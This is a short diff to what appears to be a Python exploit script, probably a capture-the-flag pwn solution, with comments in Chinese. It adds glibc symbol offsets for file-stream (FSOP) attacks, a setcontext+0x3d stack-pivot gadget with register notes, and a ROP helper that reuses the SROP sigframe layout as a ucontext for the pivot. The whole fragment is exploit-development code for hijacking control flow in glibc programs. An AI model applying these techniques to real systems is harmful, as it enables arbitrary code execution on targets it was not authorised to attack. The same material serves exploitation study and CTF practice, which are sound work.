@@ -32,9 +32,18 @@ class Off:
     read          = 0x128310
     write         = 0x128dd0
     environ       = 0x219de8   # 拿 stack leak 用
-    # FSOP
-    IO_wfile_jumps = 0x211228
-    IO_file_jumps  = 0x211030
+    # FSOP / pivot（dynsym 實測值）
+    IO_wfile_jumps  = 0x211228
+    IO_file_jumps   = 0x211030
+    IO_list_all     = 0x213480
+    IO_2_1_stdout_  = 0x213580
+    IO_2_1_stdin_   = 0x2128e0
+    IO_wdoallocbuf  = 0x092020
+    IO_wfile_overflow = 0x094110
+    setcontext      = 0x04be80
+    # ★ setcontext+0x3d：mov rsp,[rdx+0xa0] … push [rdx+0xa8]; ret
+    #   注意是 rdx 版本（glibc 2.29+），不是舊版的 rdi
+    setcontext_rdx  = 0x04bebd
 
 AT_FDCWD = -100 & 0xffffffffffffffff
 
@@ -78,6 +87,11 @@ class Rop:
             o = SIGFRAME_OFF[name]
             f[o:o + 8] = p64(val)
         return bytes(f)
+
+    # setcontext+0x3d 讀的 ucontext 跟 SROP sigframe 是同一套偏移
+    # （rsp@0xa0, rip@0xa8, rdi@0x68, rsi@0x70, rdx@0x88 全部一致）
+    # → 同一份結構兩邊都能用，不必寫兩套
+    ucontext = sigframe
 
     def srop_call(self, nr, a1=0, a2=0, a3=0, next_rip=None, next_rsp=0):
         """一次 SROP：設 rax=15 → syscall → kernel 還原成 nr(a1,a2,a3)"""
